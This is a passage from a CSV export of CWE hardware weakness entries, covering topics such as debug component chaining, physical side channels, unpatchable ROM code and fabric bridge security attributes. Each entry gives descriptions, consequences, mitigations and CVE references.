OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:IMPACT:Read Memory:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:IMPACT:Varies by Context:LIKELIHOOD:Medium::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Ensure that a debug message does not reveal any unnecessary information during the debug process for the intended response.::\",\"::REFERENCE:CVE-2021-25476:DESCRIPTION:Digital Rights Management (DRM) capability for mobile platform leaks pointer information, simplifying ASLR bypass:LINK:https://www.cve.org/CVERecord?id=CVE-2021-25476::REFERENCE:CVE-2020-24491:DESCRIPTION:Processor generates debug message that contains sensitive information (addresses of memory transactions).:LINK:https://www.cve.org/CVERecord?id=CVE-2020-24491::REFERENCE:CVE-2017-18326:DESCRIPTION:modem debug messages include cryptographic keys:LINK:https://www.cve.org/CVERecord?id=CVE-2017-18326::\",,,\"\",::121::,\"\",\n1296,\"Incorrect Chaining or Granularity of Debug Components\",Base,Incomplete,\"The product's debug components contain incorrect chaining or granularity of debug components.\",\"For debugging and troubleshooting a chip, several hardware design elements are often implemented, including: Various Test Access Ports (TAPs) allow boundary scan commands to be executed. For scanning the internal components of a chip, there are scan cells that allow the chip to be used as a stimulus and response mechanism. Chipmakers might create custom methods to observe the internal components of their chips by placing various tracing hubs within their chip and creating hierarchical or interconnected structures among those hubs. Logic errors during design or synthesis could misconfigure the interconnection of the debug components, which could allow unintended access permissions.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Availability:SCOPE:Accountability:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Modify Memory:IMPACT:Modify Files or Directories:LIKELIHOOD:Medium:NOTE:Depending on the access to debug component(s) erroneously granted, an attacker could use the debug component to gain additional understanding about the system to further an attack and/or execute other commands. This could compromise any security property, including the ones listed above.::\",\"::METHOD:Architecture or Design Review:DESCRIPTION:Appropriate Post-Si tests should be carried out at various authorization levels to ensure that debug components are properly chained and accessible only to users with appropriate credentials.:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:Appropriate Post-Si tests should be carried out at various authorization levels to ensure that debug components are properly chained and accessible only to users with appropriate credentials.:EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Ensure that debug components are properly chained and their granularity is maintained at different authentication levels.::\",\"::REFERENCE:CVE-2017-18347:DESCRIPTION:Incorrect access control in RDP Level 1 on STMicroelectronics STM32F0 series devices allows physically present attackers to extract the device's protected firmware via a special sequence of Serial Wire Debug (SWD) commands because there is a race condition between full initialization of the SWD interface and the setup of flash protection.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-18347::REFERENCE:CVE-2020-1791:DESCRIPTION:There is an improper authorization vulnerability in several smartphones. The system has a logic-judging error, and, under certain scenarios, a successful exploit could allow the attacker to switch to third desktop after a series of operations in ADB mode. (Vulnerability ID: HWPSIRT-2019-10114).:LINK:https://www.cve.org/CVERecord?id=CVE-2020-1791::\",,,\"\",::121::702::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1297,\"Unprotected Confidential Information on Device is Accessible by OSAT Vendors\",Base,Incomplete,\"The product does not adequately protect confidential information on the device from being accessed by Outsourced Semiconductor Assembly and Test (OSAT) vendors.\",\"In contrast to complete vertical integration of architecting, designing, manufacturing, assembling, and testing chips all within a single organization, an organization can choose to simply architect and design a chip before outsourcing the rest of the process to OSAT entities (e.g., external foundries and test houses). In the latter example, the device enters an OSAT facility in a much more vulnerable pre-production stage where many debug and test modes are accessible. Therefore, the chipmaker must place a certain level of trust with the OSAT. To counter this, the chipmaker often requires the OSAT partner to enter into restrictive non-disclosure agreements (NDAs). Nonetheless, OSAT vendors likely have many customers, which increases the risk of accidental sharing of information. There may also be a security vulnerability in the information technology (IT) system of the OSAT facility. Alternatively, a malicious insider at the OSAT facility may carry out an insider attack. Considering these factors, it behooves the chipmaker to minimize any confidential information in the device that may be accessible to the OSAT vendor. Logic errors during design or synthesis could misconfigure the interconnection of the debug components, which could provide improper authorization to sensitive information.\",::NATURE:ChildOf:CWE ID:285:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Availability:SCOPE:Accountability:SCOPE:Non-Repudiation:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Modify Memory:IMPACT:Modify Files or Directories:LIKELIHOOD:Medium:NOTE:The impact depends on the confidential information itself and who is inadvertently granted access. For example, if the confidential information is a key that can unlock all the parts of a generation, the impact could be severe.::\",\"::METHOD:Architecture or Design Review:DESCRIPTION:Appropriate Post-Si tests should be carried out to ensure that residual confidential information is not left on parts leaving one facility for another facility.:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:Appropriate Post-Si tests should be carried out to ensure that residual confidential information is not left on parts leaving one facility for another facility.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design:DESCRIPTION:Ensure that when an OSAT vendor is allowed to access test interfaces necessary for preproduction and returned parts, the vendor only pulls the minimal information necessary. Also, architect the product in such a way that, when an unlock device request comes, it only unlocks that specific part and not all the parts for that product line. Ensure that the product's non-volatile memory (NVM) is scrubbed of all confidential information and secrets before handing it over to an OSAT. Arrange to secure all communication between an OSAT facility and the chipmaker.:EFFECTIVENESS:Moderate::\",\"\",,,\"\",::1::180::,\"::TYPE:Maintenance:NOTE:This entry might be subject to CWE Scope Exclusion SCOPE.SITUATIONS (Focus on situations in which weaknesses may appear); SCOPE.HUMANPROC (Human/organizational process; and/or SCOPE.CUSTREL (Not customer-relevant).::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1298,\"Hardware Logic Contains Race Conditions\",Base,Draft,\"A race condition in the hardware logic results in undermining security guarantees of the system.\",\"A race condition in logic circuits typically occurs when a logic gate gets inputs from signals that have traversed different paths while originating from the same source. Such inputs to the gate can change at slightly different times in response to a change in the source signal. This results in a timing error or a glitch (temporary or permanent) that causes the output to change to an unwanted state before settling back to the desired state. If such timing errors occur in access control logic or finite state machines that are implemented in security sensitive flows, an attacker might exploit them to circumvent existing protections.\",::NATURE:ChildOf:CWE ID:362:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:IMPACT:Alter Execution Logic::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Adopting design practices that encourage designers to recognize and eliminate race conditions, such as Karnaugh maps, could result in the decrease in occurrences of race conditions.::PHASE:Implementation:DESCRIPTION:Logic redundancy can be implemented along security critical paths to prevent race conditions. To avoid metastability, it is a good practice in general to default to a secure state in which access is not given to untrusted agents.::\",\"\",,,\"\",::26::,\"\",\n1299,\"Missing Protection Mechanism for Alternate Hardware Interface\",Base,Draft,\"The lack of protections on alternate paths to access control-protected assets (such as unprotected shadow registers and other external facing unguarded interfaces) allows an attacker to bypass existing protections to the asset that are only performed against the primary path.\",\"An asset inside a chip might have access-control protections through one interface. However, if all paths to the asset are not protected, an attacker might compromise the asset through alternate paths. These alternate paths could be through shadow or mirror registers inside the IP core, or could be paths from other external-facing interfaces to the IP core or SoC. Consider an SoC with various interfaces such as UART, SMBUS, PCIe, USB, etc. If access control is implemented for SoC internal registers only over the PCIe interface, then an attacker could still modify the SoC internal registers through alternate paths by coming through interfaces such as UART, SMBUS, USB, etc. Alternatively, attackers might be able to bypass existing protections by exploiting unprotected, shadow registers. Shadow registers and mirror registers typically refer to registers that can be accessed from multiple addresses. Writing to or reading from the aliased/mirrored address has the same effect as writing to the address of the main register. They are typically implemented within an IP core or SoC to temporarily hold certain data. These data will later be updated to the main register, and both registers will be in synch. If the shadow registers are not access-protected, attackers could simply initiate transactions to the shadow registers and compromise system security.\",::NATURE:PeerOf:CWE ID:1191:VIEW ID:1194:ORDINAL:Primary::NATURE:ChildOf:CWE ID:420:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:288:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Microcontroller Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Bus/Interface Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:DoS: Resource Consumption (Other):IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Alter Execution Logic:IMPACT:Bypass Protection Mechanism:IMPACT:Quality Degradation:LIKELIHOOD:High::\",\"\",\"::PHASE:Requirements:DESCRIPTION:Protect assets from accesses against all potential interfaces and alternate paths.:EFFECTIVENESS:Defense in Depth::PHASE:Architecture and Design:DESCRIPTION:Protect assets from accesses against all potential interfaces and alternate paths.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:DESCRIPTION:Protect assets from accesses against all potential interfaces and alternate paths.:EFFECTIVENESS:Defense in Depth::\",\"::REFERENCE:CVE-2022-38399:DESCRIPTION:Missing protection mechanism on serial connection allows for arbitrary OS command execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-38399::REFERENCE:CVE-2020-9285:DESCRIPTION:Mini-PCI Express slot does not restrict direct memory access.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-9285::REFERENCE:CVE-2020-8004:DESCRIPTION:When the internal flash is protected by blocking access on the Data Bus (DBUS), it can still be indirectly accessed through the Instruction Bus (IBUS).:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8004::REFERENCE:CVE-2017-18293:DESCRIPTION:When GPIO is protected by blocking access to corresponding GPIO resource registers, protection can be bypassed by writing to the corresponding banked GPIO registers instead.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-18293::REFERENCE:CVE-2020-15483:DESCRIPTION:monitor device allows access to physical UART debug port without authentication:LINK:https://www.cve.org/CVERecord?id=CVE-2020-15483::\",,,\"\",::457::554::,\"\",\n1300,\"Improper Protection of Physical Side Channels\",Base,Stable,\"The device does not contain sufficient protection mechanisms to prevent physical side channels from exposing sensitive information due to patterns in physically observable phenomena such as variations in power consumption, electromagnetic emissions (EME), or acoustic emissions.\",\"An adversary could monitor and measure physical phenomena to detect patterns and make inferences, even if it is not possible to extract the information in the digital domain. Physical side channels have been well-studied for decades in the context of breaking implementations of cryptographic algorithms or other attacks against security features. These side channels may be easily observed by an adversary with physical access to the device, or using a tool that is in close proximity. If the adversary can monitor hardware operation and correlate its data processing with power, EME, and acoustic measurements, the adversary might be able to recover of secret keys and data.\",::NATURE:ChildOf:CWE ID:203:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:203:VIEW ID:1194:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:IMPACT:Read Application Data::\",\"::METHOD:Manual Analysis:DESCRIPTION:Perform a set of leakage detection tests such as the procedure outlined in the Test Vector Leakage Assessment (TVLA) test requirements for AES [REF-1230]. TVLA is the basis for the ISO standard 17825 [REF-1229]. A separate methodology is provided by [REF-1228]. Note that sole reliance on this method might not yield expected results [REF-1239] [REF-1240].:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:Post-silicon, perform full side-channel attacks (penetration testing) covering as many known leakage models as possible against test code.:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:Pre-silicon - while the aforementioned TVLA methods can be performed post-silicon, models of device power consumption or other physical emanations can be built from information present at various stages of the hardware design process before fabrication. TVLA or known side-channel attacks can be applied to these simulated traces and countermeasures applied before tape-out. Academic research in this field includes [REF-1231] [REF-1232] [REF-1233].:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design:DESCRIPTION:Apply blinding or masking techniques to implementations of cryptographic algorithms.::PHASE:Implementation:DESCRIPTION:Add shielding or tamper-resistant protections to the device to increase the difficulty of obtaining measurements of the side-channel.::\",\"::REFERENCE:CVE-2022-35888:DESCRIPTION:Power side-channels leak secret information from processor:LINK:https://www.cve.org/CVERecord?id=CVE-2022-35888::REFERENCE:CVE-2021-3011:DESCRIPTION:electromagnetic-wave side-channel in security-related microcontrollers allows extraction of private key:LINK:https://www.cve.org/CVERecord?id=CVE-2021-3011::REFERENCE:CVE-2019-14353:DESCRIPTION:Crypto hardware wallet's power consumption relates to total number of pixels illuminated, creating a side channel in the USB connection that allows attackers to determine secrets displayed such as PIN numbers and passwords:LINK:https://www.cve.org/CVERecord?id=CVE-2019-14353::REFERENCE:CVE-2020-27211:DESCRIPTION:Chain: microcontroller system-on-chip contains uses a register value stored in flash to set product protection state on the memory bus but does not contain protection against fault injection (CWE-1319), which leads to an incorrect initialization of the memory bus (CWE-1419) leading the product to be in an unprotected state.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-27211::REFERENCE:CVE-2013-4576:DESCRIPTION:message encryption software uses certain instruction sequences that allows RSA key extraction using a chosen-ciphertext attack and acoustic cryptanalysis:LINK:https://www.cve.org/CVERecord?id=CVE-2013-4576::REFERENCE:CVE-2020-28368:DESCRIPTION:virtualization product allows recovery of AES keys from the guest OS using a side channel attack against a power/energy monitoring interface.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-28368::REFERENCE:CVE-2019-18673:DESCRIPTION:power consumption varies based on number of pixels being illuminated in a display, allowing reading of secrets such as the PIN by using the USB interface to measure power consumption:LINK:https://www.cve.org/CVERecord?id=CVE-2019-18673::\",::Power::,,\"\",::189::699::,\"\",\n1301,\"Insufficient or Incomplete Data Removal within Hardware Component\",Base,Incomplete,\"The product's data removal process does not completely delete all data and potentially sensitive information within hardware components.\",\"Physical properties of hardware devices, such as remanence of magnetic media, residual charge of ROMs/RAMs, or screen burn-in may still retain sensitive data after a data removal process has taken place and power is removed. Recovering data after erasure or overwriting is possible due to a phenomenon called data remanence. For example, if the same value is written repeatedly to a memory location, the corresponding memory cells can become physically altered to a degree such that even after the original data is erased that data can still be recovered through physical characterization of the memory cells.\",::NATURE:ChildOf:CWE ID:226:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:IMPACT:Read Application Data::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Apply blinding or masking techniques to implementations of cryptographic algorithms.::PHASE:Implementation:DESCRIPTION:Alter the method of erasure, add protection of media, or destroy the media to protect the data.::\",\"::REFERENCE:CVE-2019-8575:DESCRIPTION:Firmware Data Deletion Vulnerability in which a base station factory reset might not delete all user information. The impact of this enables a new owner of a used device that has been factory-default reset with a vulnerable firmware version can still retrieve, at least, the previous owner's wireless network name, and the previous owner's wireless security (such as WPA2) key. This issue was addressed with improved, data deletion.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-8575::\",,,\"\",::37::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1302,\"Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\",Base,Incomplete,\"The product implements a security identifier mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. A transaction is sent without a security identifier.\",\"In a System-On-Chip (SoC), various integrated circuits and hardware engines generate transactions such as to access (reads/writes) assets or perform certain actions (e.g., reset, fetch, compute). A typical transaction is comprised of source identity (to identify the originator of the transaction) and a destination identity (to route the transaction to the respective entity) in addition to much more information in the message. Sometimes the transactions are qualified with a Security Identifier. This Security Identifier helps the destination agent decide on the set of allowed or disallowed actions. A weakness that can exist in such transaction schemes is that the source agent does not consistently include the necessary Security Identifier with the transaction. If the Security Identifier is missing, the destination agent might drop the message (resulting in an inadvertent Denial-of-Service (DoS)) or take inappropriate action by default in its attempt to execute the transaction, resulting in privilege escalation or provision of unintended access.\",::NATURE:ChildOf:CWE ID:1294:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:Such issues could be introduced during implementation and identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Bypass Protection Mechanism:IMPACT:Execute Unauthorized Code or Commands:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Transaction details must be reviewed for design inconsistency and common weaknesses.::PHASE:Implementation:DESCRIPTION:Security identifier definition and programming flow must be tested in pre-silicon and post-silicon testing.::\",\"\",,,\"\",::121::681::,\"\","
  },
  "doc-c881784ee5844d7bdbbe2577e9f6faae": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n1303,\"Non-Transparent Sharing of Microarchitectural Resources\",Base,Draft,\"Hardware structures shared across execution contexts (e.g., caches and branch predictors) can violate the expected architecture isolation between contexts.\",\"Modern processors use techniques such as out-of-order execution, speculation, prefetching, data forwarding, and caching to increase performance. Details about the implementation of these techniques are hidden from the programmer's view. This is problematic when the hardware implementation of these techniques results in resources being shared across supposedly isolated contexts. Contention for shared resources between different contexts opens covert channels that allow malicious programs executing in one context to recover information from another context. Some examples of shared micro-architectural resources that have been used to leak information between contexts are caches, branch prediction logic, and load or store buffers. Speculative and out-of-order execution provides an attacker with increased control over which data is leaked through the covert channel. If the extent of resource sharing between contexts in the design microarchitecture is undocumented, it is extremely difficult to ensure system assets are protected against disclosure.\",::NATURE:ChildOf:CWE ID:1189:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:203:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design and identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:Such issues could be introduced during implementation and identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:IMPACT:Read Memory:NOTE:Microarchitectural side-channels have been used to leak specific information such as cryptographic keys, and Address Space Layout Randomization (ALSR) offsets as well as arbitrary memory.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Microarchitectural covert channels can be addressed using a mixture of hardware and software mitigation techniques. These include partitioned caches, new barrier and flush instructions, and disabling high resolution performance counters and timers.::PHASE:Requirements:DESCRIPTION:Microarchitectural covert channels can be addressed using a mixture of hardware and software mitigation techniques. These include partitioned caches, new barrier and flush instructions, and disabling high resolution performance counters and timers.::\",\"\",,,\"\",::663::,\"::TYPE:Maintenance:NOTE:As of CWE 4.9, members of the CWE Hardware SIG are closely analyzing this entry and others to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks. Additional investigation may include other weaknesses related to microarchitectural state. Finally, this entry's demonstrative example might not be appropriate. As a result, this entry might change significantly in CWE 4.10.::\",\n1304,\"Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\",Base,Draft,\"The product performs a power save/restore operation, but it does not ensure that the integrity of the configuration state is maintained and/or verified between the beginning and ending of the operation.\",\"Before powering down, the Intellectual Property (IP) saves current state (S) to persistent storage such as flash or always-on memory in order to optimize the restore operation. During this process, an attacker with access to the persistent storage may alter (S) to a configuration that could potentially modify privileges, disable protections, and/or cause damage to the hardware. If the IP does not validate the configuration state stored in persistent memory, upon regaining power or becoming operational again, the IP could be compromised through the activation of an unwanted/harmful configuration.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:345:VIEW ID:1000::NATURE:PeerOf:CWE ID:1271:VIEW ID:1194::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Weakness introduced via missing internal integrity guarantees during power save/restore::PHASE:Integration:NOTE:Weakness introduced via missing external integrity verification during power save/restore::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:DoS: Instability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (Other):IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Alter Execution Logic:IMPACT:Quality Degradation:IMPACT:Unexpected State:IMPACT:Reduce Maintainability:IMPACT:Reduce Performance:IMPACT:Reduce Reliability:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Inside the IP, incorporate integrity checking on the configuration state via a cryptographic hash. The hash can be protected inside the IP such as by storing it in internal registers which never lose power. Before powering down, the IP performs a hash of the configuration and saves it in these persistent registers. Upon restore, the IP performs a hash of the saved configuration and compares it with the saved hash. If they do not match, then the IP should not trust the configuration.::PHASE:Integration:DESCRIPTION:Outside the IP, incorporate integrity checking of the configuration state via a trusted agent. Before powering down, the trusted agent performs a hash of the configuration and saves the hash in persistent storage. Upon restore, the IP requests the trusted agent validate its current configuration. If the configuration hash is invalid, then the IP should not trust the configuration.::PHASE:Integration:DESCRIPTION:Outside the IP, incorporate a protected environment that prevents undetected modification of the configuration state by untrusted agents. Before powering down, a trusted agent saves the IP's configuration state in this protected location that only it is privileged to. Upon restore, the trusted agent loads the saved state into the IP.::\",\"\",::Power::,,\"\",::176::,\"\",\n1310,\"Missing Ability to Patch ROM Code\",Base,Draft,\"Missing an ability to patch ROM code may leave a System or System-on-Chip (SoC) in a vulnerable state.\",\"A System or System-on-Chip (SoC) that implements a boot process utilizing security mechanisms such as Root-of-Trust (RoT) typically starts by executing code from a Read-only-Memory (ROM) component. The code in ROM is immutable, hence any security vulnerabilities discovered in the ROM code can never be fixed for the systems that are already in use. A common weakness is that the ROM does not have the ability to patch if security vulnerabilities are uncovered after the system gets shipped. This leaves the system in a vulnerable state where an adversary can compromise the SoC.\",::NATURE:ChildOf:CWE ID:1329:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This issue could be introduced during hardware architecture and design and can be identified later during Testing.::PHASE:Implementation:NOTE:This issue could be introduced during implementation and can be identified later during Testing.::PHASE:Integration:NOTE:This issue could be introduced during integration and can be identified later during Testing.::PHASE:Manufacturing:NOTE:This issue could be introduced during manufacturing and can be identified later during Testing.::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context:IMPACT:Reduce Maintainability:LIKELIHOOD:High:NOTE:When the system is unable to be patched, it can be left in a vulnerable state.::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Secure patch support to allow ROM code to be patched on the next boot.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design Implementation:DESCRIPTION:Support patches that can be programmed in-field or during manufacturing through hardware fuses. This feature can be used for limited patching of devices after shipping, or for the next batch of silicon devices manufactured, without changing the full device ROM.:EFFECTIVENESS:Moderate::\",\"\",,,\"\",::682::,\"\",\n1311,\"Improper Translation of Security Attributes by Fabric Bridge\",Base,Draft,\"The bridge incorrectly translates security attributes from either trusted to untrusted or from untrusted to trusted when converting from one fabric protocol to another.\",\"A bridge allows IP blocks supporting different fabric protocols to be integrated into the system. Fabric end-points or interfaces usually have dedicated signals to transport security attributes. For example, HPROT signals in AHB, AxPROT signals in AXI, and MReqInfo and SRespInfo signals in OCP. The values on these signals are used to indicate the security attributes of the transaction. These include the immutable hardware identity of the controller initiating the transaction, privilege level, and type of transaction (e.g., read/write, cacheable/non-cacheable, posted/non-posted). A weakness can arise if the bridge IP block, which translates the signals from the protocol used in the IP block endpoint to the protocol used by the central bus, does not properly translate the security attributes. As a result, the identity of the initiator could be translated from untrusted to trusted or vice-versa. This could result in access-control bypass, privilege escalation, or denial of service.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Gain Privileges or Assume 